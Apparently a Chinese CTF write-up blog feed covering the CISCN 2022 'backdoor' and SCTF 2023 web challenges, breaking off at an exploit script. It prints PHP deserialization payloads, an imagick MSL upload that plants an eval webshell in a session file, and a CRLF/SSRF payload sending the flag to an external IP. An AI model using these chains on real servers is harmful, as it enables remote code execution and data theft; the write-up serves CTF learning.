    <content type="html"><![CDATA[<p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">题目wp</a></p><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">题目中关键的利用知识点</a></p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/tree/master">这里面有backdoor的docker容器</a></p><p>这里写这篇文章的目的是来加深对这道题的理解</p><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;__sleep failed...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">            ) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">                <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); // 没有<span class="title">echo</span></span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，存在两个魔法函数：</p><ul><li><code>__sleep()</code>，执行serialize()时，先会调用这个函数。这里可以实现任意文件包含。</li><li><code>__wakeup()</code>，执行unserialize()时，先会调用这个函数。这里可以执行一次无参函数结构。</li></ul><p>对于<code>__sleep__</code>来说，如果我们能够包含临时文件或者session即可rce。</p><p>目前的思路就有了，我们能够通过回调函数调用<code>session_start</code>，这里会触发序列化操作，如果我们能够控制session内容，那么就可以触发<code>__sleep</code>函数进行文件包含达成rce。接下来的目标则是想办法控制session内容。</p><p>(<strong>这个<code>session_start</code>是关键，在开启这个的时候会自动进行序列化，就是将session里的值进行序列化后存入存储介质中，然后因为访问了session中的数据，会自动将session中的值进行反序列化操作</strong>)</p><p><img src="../images/image-20230621160515951.png" alt="image-20230621160515951"></p><p>(<strong>是先进行—-反序列化—-在进行—-序列化—-操作</strong>)</p><p>对于<code>__wakeup__</code>来说，我们可以执行一次php内部类，那么我们可以利用此来探测信息</p><p>构造反序列化payload查看phpinfo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621162803997.png" alt="image-20230621162803997"></p><p>发现imagick拓展，想起之前看过的文章<a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">exploiting-arbitrary-object-instantiations</a>，文章讲述了针对以下结构的php代码的一种攻击方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>再查看一下<code>__wakeup</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (</span><br><span class="line">               <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">               <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">           ) &#123;</span><br><span class="line">                   <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">               <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">               </span></span><br><span class="line"><span class="class">               <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); </span></span><br><span class="line"><span class="class">           &#125;</span></span><br><span class="line"><span class="class">   &#125;</span></span><br></pre></td></tr></table></figure><p>一方面题目给了同类型代码，另一方面题目限制了通过内置类的利用，显然我们需要利用<code>imagick</code>的特性进行攻击</p><p><code>imagick</code>类在初始化时可以执行<code>Magick Scripting Language</code>。那么考虑用其特性，在临时文件中写入<code>Magick Scripting Language</code>，然后在<code>imagick</code>类<strong>初始化的时候执行临时文件并且写入<code>session</code>文件</strong>。再触发<code>__sleep</code>包含<code>session</code>文件以<code>RCE</code>。</p><p>首先利用网站提供的功能，删除<code>/tmp</code>下的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:9999/?cmd=rm</span></span><br></pre></td></tr></table></figure><p>接下来发包写入session</p><p>构造反序列化数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="string">&quot;vid:msl:/tmp/php*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;imagick&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><strong>最后在反序列化的时候是会执行这样</strong>  <code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code></p><p>发包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>path%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>argv%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>vid%<span class="number">3</span>Amsl%<span class="number">3</span>A%<span class="number">2</span>Ftmp%<span class="number">2</span>Fphp*%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>imagick%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Length: 703</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;image&gt;</span></span><br><span class="line"><span class="comment"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt;</span></span><br><span class="line"><span class="comment"> &lt;write filename=&quot;/tmp/sess_snakin&quot; /&gt;</span></span><br><span class="line"><span class="comment">&lt;/image&gt;</span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979--</span></span><br></pre></td></tr></table></figure><p>这里就是强制文件上传    <code>xml</code>这些内容就会上传到<code>/tmp/php*</code>   临时文件下  </p><p>接着因为<code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code>  初始会执行<code>msl</code>语言，所以临时文件里的内容就会被执行  </p><p>就是将序列化好的字符进行base64编码  然后传入<code>/tmp/sess_snakin</code>下</p><p><img src="../images/image-20230621163522068.png" alt="image-20230621163522068"></p><p>随后使用执行一次任意无参函数的功能，触发<code>session_start</code>函数，并设置<code>cookie</code>为<code>PHPSESSID=snakin</code>，即可文件包含<code>session</code>，成功<code>RCE</code>。<code>flag</code>执行根目录的<code>readflag</code>即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>session_start%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;/readflag&#x27;</span>); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=snakin</span></span><br></pre></td></tr></table></figure><p>上面的传的序列化字符就是为了开启<code>session_start()</code>的</p><p><strong>然后就会进行反序列化将path给赋值，反序列化完后再进行序列化，将序列化后的执行存入存储介质中 因为session文件中含有php代码，包含的时候就会执行</strong>  </p><p>上面就是<code>imagick</code>配合<code>session</code>进行rce的过程了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/&quot;&gt;题目wp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/exploiting</summary>
      
    
    
    
    
    <category term="ciscn决赛-2022-backdoor" scheme="https://ke1nys.github.io/tags/ciscn%E5%86%B3%E8%B5%9B-2022-backdoor/"/>
    
  </entry>
  
  <entry>
    <title>sctf-web-2023</title>
    <link href="https://ke1nys.github.io/posts/99a58670.html"/>
    <id>https://ke1nys.github.io/posts/99a58670.html</id>
    <published>2023-06-20T09:28:27.000Z</published>
    <updated>2023-06-24T13:50:21.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a><strong>ezcheck1n</strong></h2><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/hint提示是</span><br><span class="line"></span><br><span class="line">find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server</span><br><span class="line"></span><br><span class="line">去寻找flag在哪</span><br><span class="line"></span><br><span class="line">他看来有两个路由有P在配置文件中</span><br><span class="line"></span><br><span class="line">nss的考点中有</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>后端是 Server: Apache/2.4.54 (Debian) 中间件是 Server: Apache/2.4.55 (Unix)</strong></p><p><strong>这就是题目提示的两个容器的意思</strong></p><p><img src="../images/image-20230620194824661.png" alt="image-20230620194824661"></p><p>但是试了一下  发现不行  就没往这方面想了   没想到的最后wp里还是用它</p><p>(就是在其基础上修改一下就行了)</p><p><img src="../images/image-20230620195107173.png" alt="image-20230620195107173"></p><p><strong>题目就是提示了这几点  <code>post</code>指的是<code>post.jpeg</code>  然后就会看到下面的这个2022</strong></p><p>(就是当时想不明白这个url有啥用。。。。。。。)</p><p>这里的<code>url</code>是用来ssrf然后将flag带出到自己的vps监听端口上</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/2023/1%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/2022.php%3furl%3d101.42.39.110:3389%253fa%253d</span><br></pre></td></tr></table></figure><p>这里的<code>2022.php</code>是猜出来的，因为题目给了是<code>show_source(2023.php)</code>   然后图片给的是2022，使用就是靠这里猜出来的</p><p><img src="../images/image-20230620201530382.png" alt="image-20230620201530382"></p><p><img src="../images/image-20230620201513988.png" alt="image-20230620201513988"></p><h2 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h2><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FUMO在你的网站上留下了后门 ᗜˬᗜ，她是怎么使用这个后门的捏？ ᗜˬᗜ（flag 在 /flag）</span><br></pre></td></tr></table></figure><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;FUNC_LIST&quot;</span>, <span class="title function_ invoke__">get_defined_functions</span>());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[flag]/m&#x27;</span>, <span class="variable">$this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">is_string</span>(<span class="variable">$func</span>) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">            <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ini_set(&#39;open_basedir&#39;, __DIR__.&quot;:/tmp&quot;);</code></p><p>  这里的代码将 <code>open_basedir</code> 配置选项设置为当前目录以及 <code>/tmp</code> 目录，因此 PHP 脚本只能访问当前目录和 <code>/tmp</code> 目录下的文件，无法访问其他目录。</p><p>这道题是根据这个题改的</p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</a></p><p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/</a></p><p><strong>这里的多一嘴来讲讲这个参考的这个<code>backdoor</code></strong>     <a href="https://ke1nys.github.io/posts/869a12bf.html">ciscn决赛-2022-backdoor</a></p><p>稍微改了点，include变为了readdir，因此我们很难getshell。那就改变思路了。首先我们知道flag是在根目录的，但是由于open_basedir我们并没有权限去读取，因此我们需要配合imagick的msl语言特性，把flag读到/tmp目录下，然后再利用上述payload去触发__sleep，读取flag文件<br>首先我们需要用如下payload把flag移动到tmp目录下</p><p><strong>先去触发<code>phpinfo</code>()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fumo_backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621164501671.png" alt="image-20230621164501671"></p><p>开启了<code>imagick</code>扩展</p><p><strong>思路</strong></p><ul><li>先进行临时文件上传 然后创建一个session_xxx文件，然后imagick初始化的时候会执行临时文件里的内容如何值就会赋给session_xxx文件</li></ul><p>(<strong>这里会创建两个文件，一个用来存序列化的数据(这里的path必须是第二次session的名字)，为了给path赋值，另一个是为了存flag</strong>)</p><ul><li>第二步还是进行临时文件上传  然后还是创建一个文件(必须和第一次不同名字)  内容是将flag移到该文件中   就是移到第二步设置的文件中</li></ul><ul><li>第三步进行session_start()的开启   来触发第一次session的反序列化(<strong>为了设置path,反序列化结束后会接着会序列</strong>)  然后可以读取到flag了</li></ul><p>因为这里的是公共容器，会容易被删除自己刚创建的session文件  所以需要python脚本</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 